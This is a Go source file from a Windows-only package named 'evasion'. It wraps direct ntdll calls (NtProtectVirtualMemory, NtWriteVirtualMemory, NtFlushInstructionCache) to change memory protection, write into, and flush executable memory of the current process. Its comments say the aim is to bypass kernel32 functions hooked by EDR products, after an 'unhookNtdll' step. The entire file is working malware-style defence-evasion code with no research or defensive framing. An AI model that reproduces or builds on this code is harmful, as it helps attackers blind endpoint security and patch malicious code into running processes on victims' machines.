//go:build windows
// +build windows

package evasion

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modNtdll                  = windows.NewLazySystemDLL("ntdll.dll")
	procNtProtectVirtualMemory = modNtdll.NewProc("NtProtectVirtualMemory")
	procNtWriteVirtualMemory   = modNtdll.NewProc("NtWriteVirtualMemory")
	procNtFlushInstructionCache = modNtdll.NewProc("NtFlushInstructionCache")
)

const ntCurrentProcess = ^uintptr(0) // (HANDLE)-1

// ntProtect changes memory protection via NtProtectVirtualMemory,
// bypassing kernel32!VirtualProtect (which may be hooked by EDR).
func ntProtect(addr uintptr, size uintptr, newProtect uint32) (oldProtect uint32, ok bool) {
	baseAddr := addr
	regionSize := size
	r, _, _ := procNtProtectVirtualMemory.Call(
		ntCurrentProcess,
		uintptr(unsafe.Pointer(&baseAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	return oldProtect, r == 0
}

// ntWrite writes bytes directly via NtWriteVirtualMemory.
// After unhookNtdll() this reaches a clean syscall stub.
func ntWrite(dst uintptr, src []byte) bool {
	var written uintptr
	r, _, _ := procNtWriteVirtualMemory.Call(
		ntCurrentProcess,
		dst,
		uintptr(unsafe.Pointer(&src[0])),
		uintptr(len(src)),
		uintptr(unsafe.Pointer(&written)),
	)
	return r == 0
}

// ntFlush flushes the CPU instruction cache after patching executable memory.
func ntFlush(addr uintptr, size uintptr) {
	procNtFlushInstructionCache.Call(ntCurrentProcess, addr, size)
}
